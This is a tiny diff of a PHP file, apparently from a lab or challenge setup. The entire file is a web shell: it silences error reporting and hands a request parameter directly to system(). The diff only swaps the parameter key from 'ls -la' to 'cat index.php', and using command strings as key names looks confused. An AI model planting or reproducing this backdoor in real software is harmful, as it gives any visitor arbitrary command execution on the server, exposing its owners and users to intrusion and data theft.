@@ -1,6 +1,6 @@
 <?php
 
 error_reporting(0);
-system($_GET["ls -la"]);
+system($_GET["cat index.php"]);
 
 ?> 
